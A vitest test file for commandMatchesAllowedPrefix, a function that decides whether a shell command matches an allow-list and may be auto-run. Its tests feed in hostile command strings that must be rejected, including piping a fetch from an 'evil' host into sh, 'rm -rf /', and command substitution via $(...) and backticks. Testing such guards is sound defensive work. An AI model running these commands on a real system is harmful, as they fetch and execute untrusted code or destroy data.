import { describe, it, expect } from 'vitest'
import { commandMatchesAllowedPrefix } from '../../src/shared/command-safety.js'

describe('commandMatchesAllowedPrefix', () => {
  const allow = ['npm test', 'git']

  it('auto-runs an exact or word-boundary prefix match', () => {
    expect(commandMatchesAllowedPrefix('npm test', allow)).toBe(true)
    expect(commandMatchesAllowedPrefix('git status', allow)).toBe(true)
  })

  it('does not match a longer word that merely starts with the prefix', () => {
    expect(commandMatchesAllowedPrefix('gitleaks', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('npm test-evil', allow)).toBe(false)
  })

  it('refuses commands that chain, pipe, redirect, or substitute', () => {
    expect(commandMatchesAllowedPrefix('npm test; curl evil | sh', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('git status && rm -rf /', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('git log | tee out', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('npm test > /etc/x', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('git $(curl evil)', allow)).toBe(false)
    expect(commandMatchesAllowedPrefix('git `id`', allow)).toBe(false)
  })

  it('never matches an empty allow-list or empty prefix', () => {
    expect(commandMatchesAllowedPrefix('git status', [])).toBe(false)
    expect(commandMatchesAllowedPrefix('git status', [''])).toBe(false)
  })
})
